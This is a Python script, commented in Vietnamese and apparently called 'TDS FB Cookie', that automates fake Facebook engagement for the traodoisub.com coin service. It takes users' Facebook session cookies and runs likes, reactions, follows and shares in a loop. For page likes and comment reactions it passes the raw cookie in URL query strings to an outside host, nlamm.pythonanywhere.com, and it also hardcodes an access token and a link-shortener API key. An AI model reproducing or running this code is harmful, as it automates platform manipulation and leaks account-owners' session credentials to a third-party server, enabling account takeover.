...
logo ="""
      ...
      \033[1;37m| \ | | |   (_)      | |            | |       
      \033[1;35m|  \| | |__  _ ______| |_ ___   ___ | |        
      \033[1;37m| . ` | '_ \| |______| __/ _ \ / _ \| |         
      \033[1;35m| |\  | | | | |      | || (_) | (_) | |  
      \033[1;37m\_| \_/_| |_|_|       \__\___/ \___/|_|
\033[1;31m────────────────────────────────────────────────────────────
\033[1;37m☞ \033[1;35mTool: TDS FB Cookie \033[1;35m
\033[1;37m☞ \033[1;32mAdmin: \033[1;33mTrần Văn Nhí
\033[1;37m☞ \033[1;35mYoutube: Đang update
\033[1;37m☞ \033[1;36mZalo: \033[1;31m0822227341
\033[1;37m☞ \033[1;32mBox Suport: \033[1;37mhttps://zalo.me/g/oktrmh883 
\033[1;31m────────────────────────────────────────────────────────────"""
print(logo)
...
print(key)
link1=requests.get('https://mneylink.com/api?api=87e4513df7774b42563108961eb542654b5af0e7&url={}&alias={}'.format(url, strings)).json()
#onkey=requests.get('https://pastebin.com/raw/VgSgBekx').text
link=link1['shortenedUrl']
print('Link Lấy Key: '+str(link))
...
if __name__=="__main__":
    ...
    listjob = []
    listck = []
    token_tds ='TDS9JiNyVmdlNnI6IiclZXZzJCLiMEUD1EaulWTiojIyV2c1Jye'
    ...
    for i in job.split('+'):
        ...
        elif i=='2':listjob.append('like2')
        elif i=='3':listjob.append('like3')
        elif i=='4':listjob.append('cx')
        elif i=='5':listjob.append('follow')
        elif i=='6':listjob.append('page')
        elif i=='7':listjob.append('cxcm')
        elif i=='8':listjob.append('share')
        elif i=='9':listjob.append('gr')
        else:Write.Print('Nhập Sai !',Colors.green_to_yellow,interval=0.0001),exit(0)

    for i in range(99999):
        ck = str(Write.Input(f'Nhập Cookie FB Thứ {i+1}: ',Colors.green_to_yellow,interval=0.0001))
        if ck == "":
            break
        else:
            listck.append(ck)
    while (True):
        for i in range(len(listck)):
            ...
            if 'Đăng nhập Facebook để xem trang cá nhân.' in str(check):
                ...
                s=0
                if 'success' in run:
                    Write.Print(run['data']["msg"]+f' <> Account: {user} <> ID: {uid}\n',Colors.green_to_red,interval=0.0001)
                else:
            ...
            while (True):
                ...
                if str(jc)=='like':
                    try:
                        joblike = requests.get(f'https://traodoisub.com/api/?fields=like&access_token={token_tds}').json()
                        ...
                        for i in range(int(len(joblike))):
                            try:
                                ...
                                if b == []:continue
                                    ...
                                    url = host+c
                                    done = requests.get(url=url, headers=head_job).text
                                    if 'Tài khoản của bạn hiện bị hạn chế' in done:
                                    	print("Account Đã Bị Block Tính Năng")
                                    	break
                                get_xu = requests.get(f'https://traodoisub.com/api/coin/?type=LIKE&id={id}&access_token={token_tds}').json()
                                if str(get_xu['success'])=='200':
                                    s += 1
                                    timem = datetime.now().strftime("%H:%M:%S")
                                    xucong = str(get_xu['data']['msg'])
                                    xutong = str(get_xu['data']['xu'])
                                    Write.Print(f'[{count}] | [{timem}] | [LIKE] | [{xucong}] | [{xutong}]','                      ',Colors.green_to_white,)
                                    if s > 0 and s%chuyen==0:break
                    ...
                    try:
                        joblike = requests.get(f'https://traodoisub.com/api/?fields=likegiare&access_token={token_tds}').json()
                        if 'error' in joblike:continue
                        for i in range(int(len(joblike))):
                            try:
                                id = joblike[i]['id']
                                ...
                                get_xu = requests.get(f'https://traodoisub.com/api/coin/?type=LIKEGIARE&id={id}&access_token={token_tds}').json()
                                if str(get_xu['success'])=='200':
                                    count += 1
                                    timem = datetime.now().strftime("%H:%M:%S")
                                    xucong = str(get_xu['data']['msg'])
                                    xutong = str(get_xu['data']['xu'])
                                    Write.Print(f'[{count}] | [{timem}] | [LIKEGIARE] | [{xucong}] | [{xutong}] \n',Colors.green_to_white,interval=0.0001)
                        ...
                        for i in range(int(len(joblike))):
                            try:
                                ...
                                if str(get_xu['success'])=='200':
                                    ...
                                    xucong = str(get_xu['data']['msg'])
                                    xutong = str(get_xu['data']['xu'])
                                    Write.Print(f'[{count}] | [{timem}] | [LIKESIEURE] | [{xucong}] | [{xutong}] \n',Colors.green_to_white,interval=0.0001)
                                    if count > 0 and count % chuyen == 0:
                                        break
                                for i in range(delay,0,-1):
                                    Write.Print(f'Làm Job Tiếp Theo Sau {i} Giây \r',Colors.green_to_white,interval=0.0001)
                    ...
                    try:
                        ...
                        for i in range(int(len(jobcx))):
                            try:
                                ...
                                b = re.findall('/ufi/reaction/?.*?"',a)
                                if b == []:continue
                                number = 1 if typee == "LOVE" else 3 if typee == "HAHA" else 6 if typee == "ANGRY" else 4 if typee == "WOW" else 5 if typee == "SAD" else 2
                                ...
                                if str(get_xu['success'])=='200':
                                    ...
                                    xucong = str(get_xu['data']['msg'])
                                    xutong = str(get_xu['data']['xu'])
                                    Write.Print(f'[{count}] | [{timem}] | [{typee}] | [{xucong}] | [{xutong}] \n',Colors.green_to_white,interval=0.0001)
                                    if count > 0 and count % chuyen == 0:
                                        break
                                for i in range(delay,0,-1):
                                    Write.Print(f'Làm Job Tiếp Theo Sau {i} Giây \r',Colors.green_to_white,interval=0.0001)
                    ...
                    try:
                        ...
                        for i in range(int(len(jobfollow))):
                            try:
                                ...
                                if str(get_xu['success'])=='200':
                                    ...
                                    xucong = str(get_xu['data']['msg'])
                                    xutong = str(get_xu['data']['xu'])
                                    Write.Print(f'[{count}] | [{timem}] | [FOLLOW] | [{xucong}] | [{xutong}] \n',Colors.green_to_white,interval=0.0001)
                                    if count > 0 and count % chuyen == 0:
                                        break
                                for i in range(delay,0,-1):
                                    Write.Print(f'Làm Job Tiếp Theo Sau {i} Giây \r',Colors.green_to_white,interval=0.0001)
                 	...
                 	try:
                         ...
                         if 'error' in jobpage:pass
                         for i in range(int(len(jobpage))):
                             try:
                                 id = jobpage[i]['id']
                                 donelp = requests.get(f'http://nlamm.pythonanywhere.com/likepage?cookie={ck}&idpost={id}').json()
                 	...
                 	try:
                 		jobcxcm = requests.get(f'https://traodoisub.com/api/?fields=reactcmt&access_token={token_tds}').json()
                 		if 'error' in jobcxcm:pass
                 		for i in range(int(len(jobcxcm))):
                 			try:
                 				id = jobcxcm[i]['id']
                 				type = jobcxcm[i]['type']
                 				donecxcm = requests.get(f'http://nlamm.pythonanywhere.com/apireac_cmt?cookie={ck}&idpost={id}&type={type}').json()
                 				type2 = str(type)+'CMT'
                 				get_xu = requests.get(f'https://traodoisub.com/api/coin/?type={type2}&id={id}&access_token={token_tds}').json()
                 				if 'success' in get_xu:
                 					count += 1
                 					timem = datetime.now().strftime("%H:%M:%S")
                 					xucong = str(get_xu['data']['msg'])
                 					xutong = str(get_xu['data']['xu'])
                 					Write.Print(f'[{count}][{timem}][CX COMMENT][{id}][{xucong}][{xutong}] \n',Colors.green_to_white,interval=0.005)
                 				for i in range(delay,0,-1):
                 					Write.Print(f'Làm Job Tiếp Theo Sau {i} Giây \r',Colors.green_to_blue,interval=0.005)
                 					time.sleep(1)
                 			except:pass
